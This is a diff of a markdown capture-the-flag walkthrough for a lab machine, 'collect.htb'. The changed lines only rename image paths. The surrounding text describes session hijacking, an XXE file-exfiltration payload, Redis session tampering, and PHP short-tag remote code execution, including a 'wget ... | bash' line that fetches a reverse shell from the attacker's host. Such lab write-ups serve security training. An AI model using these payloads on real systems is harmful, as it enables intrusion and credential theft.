@@ -71,7 +71,7 @@ Regular fuzzing did not do much for me, but when I fuzzed the HTTP Host header u
 
 We can add both of these to the `/etc/hosts` file. The `developers` subdomain requires a password to enter.
 
-<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Forum
 
@@ -107,7 +107,7 @@ token=ddac62a28254561001277727cb397baf
 
 By replacing the PHPSESSID with our own created user, we can become an administrator by sending the same POST request to the website.
 
-<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (37) (1).png" alt=""><figcaption></figcaption></figure>
 
 From here, we can register our own user and gain access to the API stuff.
 
@@ -147,7 +147,7 @@ After some trial and error, I found that using the `php://filter/` method worked
 %exfiltrate;
 ```
 
-<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (35) (1).png" alt=""><figcaption></figcaption></figure>
 
 Payload used:
 
@@ -157,7 +157,7 @@ manage_api=<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe S
 
 From here, I wanted to read the `/var/www/developers/.htpasswd` file since we found a password on it earlier.
 
-<figure><img src="../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (42) (1).png" alt=""><figcaption></figcaption></figure>
 
 Using `john`, we could crack the hash to give `r0cket` as the password. We were confronted with another login page.
 
@@ -167,21 +167,21 @@ This time, we need to find credentials elsewhere. That `redis` instance is likel
 
 I tried checking for `config.php` files but was unable to find any. I knew that we had to go 'up' one directory because the current directory contained nothing, Some googling about Redis led me to the `bootstrp.php` file, which worked. It was located at `../bootstrp.php`.
 
-<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Redis
 
 We can login via `redis-cli` wth credentials.
 
-<figure><img src="../../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (36) (1).png" alt=""><figcaption></figcaption></figure>
 
 Then, we can list the keys and other information within this database.
 
-<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 Seems that all of these keys are empty arrays, for some reason. I registered another user within the `collect.htb` website to see if we can do any other things.
 
-<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (28) (1).png" alt=""><figcaption></figcaption></figure>
 
 So we have this, and we need a way to authenticate ourselves.  For this, we can set our role to `admin` and also set a `auth|s:1:\"a\"` bit, because this would grant us access to the `developers` endpoint.
 
@@ -207,19 +207,19 @@ This tool linked worked like a charm:
 
 This had some form of length barrier that was crashing the request. As such, we can use **PHP Shorthand Code,** which is basically a short form for PHP code. This involves the usage of the `<?=` tags. Then, since we have RCE, we can host the shell on my web server instead.
 
-<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (29) (2).png" alt=""><figcaption></figcaption></figure>
 
 Testing this out, I used this command ``<?= `id` ?>.``
 
 This worked out pretty well as I was able to see the output here.
 
-<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (38) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can then replace the command with ``<?=`wget -O - 10.10.14.152/b|bash` ?>``
 
 Now, we have a reverse shell as `www-data`.
 
-<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation to Victor
 
@@ -229,7 +229,7 @@ Victor was the only user on this machine, and we needed to find his credentials 
 
 Within the `~/developers/login.php` file, I found some credentials.
 
-<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (27) (2).png" alt=""><figcaption></figcaption></figure>
 
 It appears there was a MySQL Instance on the machine running. We can login to that using `mysql -u webapp_user -p`.
 
@@ -239,7 +239,7 @@ Then, we can enumerate this database.
 
 We can find a hash from the `developers` database.
 
-<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (34) (1).png" alt=""><figcaption></figcaption></figure>
 
 Couldn't crack the hash though.
 
@@ -355,7 +355,7 @@ We can do this with the MySQL instance we accessed earlier.
 
 Now we can login as this user using our credentials.
 
-<figure><img src="../../../.gitbook/assets/image (9) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 This would give us a token, which is needed for the `X-Access-Token` header. Reading the documentation for the API through accessing `http://127.0.0.1:3000/documentation`, we can see that we need to send a POST request to `/admin/mesages/send` to interact with the vulnerable function.
 
